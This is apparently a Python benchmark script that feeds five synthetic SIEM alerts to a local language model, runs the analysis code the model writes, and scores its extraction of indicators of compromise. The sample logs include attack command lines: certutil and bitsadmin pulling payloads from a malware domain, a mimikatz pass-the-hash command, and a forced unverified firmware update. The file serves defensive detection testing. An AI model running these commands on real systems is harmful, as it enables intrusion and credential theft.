import json, time, urllib.request, subprocess, sys, re, os

OLLAMA_URL = os.environ.get("OLLAMA_URL", "http://host.docker.internal:11434/v1/chat/completions")
MODEL = os.environ.get("MODEL", "deepseek-coder:6.7b")

SYSTEM = """You are a security analyst. Generate a SHORT Python script that:
1. Embeds the SIEM alert data as a string variable
2. Uses regex to extract ALL IOCs: IP addresses, usernames, hostnames, file hashes (MD5), file paths, domain names
3. Analyzes the events for security findings
4. Prints valid JSON with keys: findings, iocs, risk_score, recommendations
Each IOC: {"type":"ipv4/username/hostname/hash_md5/file_path","value":"...","confidence":"high/medium"}
Use ONLY stdlib. Keep it SHORT - under 100 lines. No input(), no subprocess, no network."""

TESTS = [
    {
        "name": "B1_apt_intrusion",
        "siem": {
            "title": "APT Multi-Stage Intrusion Detected",
            "source_ip": "203.0.113.42", "destination_ip": "10.0.0.5",
            "hostname": "CORP-DC-01", "username": "svc_exchange",
            "rule_name": "APT_MultiStage",
            "raw_log": "EventID=4624 LogonType=3 SourceIP=203.0.113.42 User=svc_exchange TargetHost=CORP-DC-01\nEventID=4688 NewProcessName=C:\\Windows\\System32\\cmd.exe ParentProcess=C:\\Windows\\System32\\services.exe CommandLine=cmd /c whoami & net user & ipconfig /all\nEventID=5140 ShareName=ADMIN$ SourceIP=203.0.113.42 User=svc_exchange\nEventID=4698 TaskName=WindowsUpdate TaskContent=C:\\Windows\\Temp\\svcupdate.exe User=svc_exchange\nMD5=a1b2c3d4e5f6789012345678abcdef01 File=svcupdate.exe"
        },
        "expected": ["203.0.113.42", "svc_exchange", "CORP-DC-01", "a1b2c3d4e5f6789012345678abcdef01"],
        "prompt": "Analyze this APT intrusion. Extract ALL IOCs. Output JSON."
    },
    {
        "name": "B2_lolbin",
        "siem": {
            "title": "LOLBin Abuse - Certutil Payload Download",
            "source_ip": "10.0.0.33", "destination_ip": "91.195.240.117",
            "hostname": "WS-SALES-11", "username": "jdoe",
            "rule_name": "LOLBin_CertUtil_Download",
            "raw_log": "EventID=4688 NewProcessName=certutil.exe CommandLine=certutil -urlcache -split -f http://malware-delivery.io/payload.exe update.exe User=jdoe\nEventID=4688 NewProcessName=bitsadmin.exe CommandLine=bitsadmin /transfer job http://malware-delivery.io/stage2.dll stage2.dll User=jdoe\nDNS query: malware-delivery.io from 10.0.0.33\nEventID=4688 NewProcessName=update.exe ParentProcess=certutil.exe User=jdoe"
        },
        "expected": ["10.0.0.33", "91.195.240.117", "malware-delivery.io", "jdoe"],
        "prompt": "Analyze LOLBin abuse. Extract ALL IOCs including domains and IPs. Output JSON."
    },
    {
        "name": "B3_firmware",
        "siem": {
            "title": "Firmware Integrity Violation - PLC",
            "source_ip": "10.0.0.200", "destination_ip": "10.0.0.1",
            "hostname": "PLC-CTRL-01", "username": "scada_svc",
            "rule_name": "FW_Integrity_Violation",
            "raw_log": "FW_CHECK FAIL host=PLC-CTRL-01 expected_hash=3f7a9b2c1d4e5f6a actual_hash=deadbeef12345678 component=bootloader\nEventID=4688 NewProcessName=fwupdate.exe CommandLine=fwupdate.exe --force --no-verify --target=bootloader User=scada_svc SourceIP=10.0.0.200\nNetflow: 10.0.0.200 -> 185.220.101.99:443 bytes=2048000 proto=TCP process=fwupdate.exe\nSYSLOG: PLC-CTRL-01 kernel: firmware signature verification DISABLED"
        },
        "expected": ["10.0.0.200", "185.220.101.99", "PLC-CTRL-01", "deadbeef12345678", "scada_svc"],
        "prompt": "Analyze firmware attack on ICS. Extract ALL IOCs. Output JSON."
    },
    {
        "name": "B4_ssh_brute",
        "siem": {
            "title": "SSH Brute Force Attack",
            "source_ip": "10.0.0.99", "destination_ip": "10.0.0.5",
            "hostname": "WEB-PROD-01", "username": "admin",
            "rule_name": "SSH_BruteForce",
            "raw_log": "Mar 15 10:23:45 sshd[12345]: Failed password for admin from 10.0.0.99 port 22 ssh2\nMar 15 10:23:46 sshd[12345]: Failed password for admin from 10.0.0.99 port 22 ssh2\nMar 15 10:23:47 sshd[12345]: Failed password for admin from 10.0.0.99 port 22 ssh2\nMar 15 10:23:48 sshd[12345]: Failed password for admin from 10.0.0.99 port 22 ssh2\nMar 15 10:23:49 sshd[12345]: Accepted password for admin from 10.0.0.99 port 22 ssh2"
        },
        "expected": ["10.0.0.99", "admin", "WEB-PROD-01"],
        "prompt": "Analyze SSH brute force. Extract ALL IOCs. Output JSON."
    },
    {
        "name": "B5_pth",
        "siem": {
            "title": "NTLM Pass-the-Hash Lateral Movement",
            "source_ip": "10.0.0.50", "destination_ip": "10.0.0.200",
            "hostname": "WS-FINANCE-03", "username": "svc_backup",
            "rule_name": "PtH_Detected",
            "raw_log": "EventID=4624 LogonType=9 SourceIP=10.0.0.50 TargetHost=DC-PRIMARY.corp.local TargetIP=10.0.0.200 User=svc_backup NTLM_hash=aad3b435b51404eeaad3b435b51404ee Process=svchost.exe ParentProcess=mimikatz.exe CommandLine=sekurlsa::pth /user:svc_backup /domain:corp.local /ntlm:aad3b435b51404eeaad3b435b51404ee"
        },
        "expected": ["10.0.0.50", "10.0.0.200", "svc_backup", "aad3b435b51404eeaad3b435b51404ee", "mimikatz.exe"],
        "prompt": "Analyze pass-the-hash lateral movement. Extract ALL IOCs. Output JSON."
    }
]


def run_test(test):
    siem_json = json.dumps(test["siem"], indent=2)
    user_msg = f"SIEM ALERT:\n{siem_json}\n\n{test['prompt']}"

    payload = json.dumps({"model": MODEL, "messages": [
        {"role": "system", "content": SYSTEM},
        {"role": "user", "content": user_msg}
    ], "temperature": 0.3, "max_tokens": 2048}).encode()

    req = urllib.request.Request(OLLAMA_URL, data=payload, headers={"Content-Type": "application/json"})
    print(f"\n{'='*60}")
    print(f"TEST: {test['name']}")
    print(f"Calling {MODEL}...", flush=True)

    start = time.time()
    try:
        with urllib.request.urlopen(req, timeout=600) as resp:
            result = json.loads(resp.read())
    except Exception as e:
        print(f"  LLM FAILED: {e}")
        return {"name": test["name"], "status": "llm_failed"}

    elapsed = time.time() - start
    content = result["choices"][0]["message"]["content"]
    usage = result.get("usage", {})
    tokens_out = usage.get("completion_tokens", 0)
    print(f"  {len(content)} chars, {tokens_out} tokens in {elapsed:.0f}s")

    # Extract code
    if "```python" in content:
        code = content.split("```python")[1].split("```")[0].strip()
    elif "```" in content:
        code = content.split("```")[1].split("```")[0].strip()
    else:
        code = content.strip()

    # Run
    try:
        r = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=30)
        if r.returncode != 0:
            print(f"  EXEC FAILED (rc={r.returncode}): {r.stderr[:200]}")
            return {"name": test["name"], "status": "exec_failed", "time": elapsed}
        stdout = r.stdout
    except Exception as e:
        print(f"  EXEC ERROR: {e}")
        return {"name": test["name"], "status": "exec_error", "time": elapsed}

    # Parse JSON
    try:
        # Try to find JSON in output
        stdout_clean = stdout.strip()
        if not stdout_clean.startswith("{"):
            # Find first { and last }
            start_idx = stdout_clean.find("{")
            end_idx = stdout_clean.rfind("}")
            if start_idx >= 0 and end_idx > start_idx:
                stdout_clean = stdout_clean[start_idx:end_idx+1]
        output = json.loads(stdout_clean)
    except:
        print(f"  JSON FAILED: {stdout[:200]}")
        return {"name": test["name"], "status": "json_failed", "time": elapsed}

    findings = output.get("findings", [])
    iocs = output.get("iocs", [])
    risk = output.get("risk_score", 0)

    found_vals = set()
    for ioc in iocs:
        if isinstance(ioc, dict):
            found_vals.add(str(ioc.get("value","")).lower())
        else:
            found_vals.add(str(ioc).lower())

    hits = sum(1 for e in test["expected"] if e.lower() in found_vals or any(e.lower() in fv for fv in found_vals))
    total = len(test["expected"])

    print(f"  Findings: {len(findings)}, IOCs: {len(iocs)}, Matched: {hits}/{total}, Risk: {risk}")
    for ioc in iocs[:8]:
        if isinstance(ioc, dict):
            print(f"    {ioc.get('type','?')}: {ioc.get('value','?')}")

    missed = [e for e in test["expected"] if e.lower() not in found_vals and not any(e.lower() in fv for fv in found_vals)]
    if missed:
        print(f"  MISSED: {missed}")

    return {
        "name": test["name"], "status": "completed",
        "findings": len(findings), "iocs_found": len(iocs),
        "iocs_matched": hits, "iocs_expected": total,
        "risk_score": risk, "time": round(elapsed, 1)
    }


if __name__ == "__main__":
    print(f"PATH B TEST — {MODEL} via {OLLAMA_URL}")

    results = []
    for test in TESTS:
        r = run_test(test)
        results.append(r)

    # Summary
    print(f"\n{'='*70}")
    print(f"{'Test':<20} {'Status':<12} {'IOCs':<10} {'Findings':<10} {'Risk':<6} {'Time'}")
    print("-"*70)
    total_hits = total_exp = completed = total_findings = 0
    for r in results:
        s = r.get("status","?")
        ioc_str = f"{r.get('iocs_matched',0)}/{r.get('iocs_expected',0)}" if s == "completed" else "-"
        f = r.get("findings", 0)
        risk = r.get("risk_score", "-")
        t = f"{r.get('time',0)}s"
        print(f"{r['name']:<20} {s:<12} {ioc_str:<10} {f:<10} {risk:<6} {t}")
        if s == "completed":
            completed += 1
            total_hits += r.get("iocs_matched", 0)
            total_exp += r.get("iocs_expected", 0)
            total_findings += f

    print("-"*70)
    pct = 100*total_hits//total_exp if total_exp > 0 else 0
    print(f"IOC rate: {total_hits}/{total_exp} ({pct}%)")
    print(f"Completed: {completed}/{len(TESTS)}, Findings: {total_findings}")

    if pct >= 60: print("\nCONCLUSION: Path B works — LLM extracts IOCs from SIEM data")
    elif pct >= 30: print("\nCONCLUSION: Marginal — needs better prompts or larger model")
    else: print("\nCONCLUSION: Path B weak — need DPO training or 7B+ model")

    with open("/tmp/path_b_results.json", "w") as f:
        json.dump(results, f, indent=2)
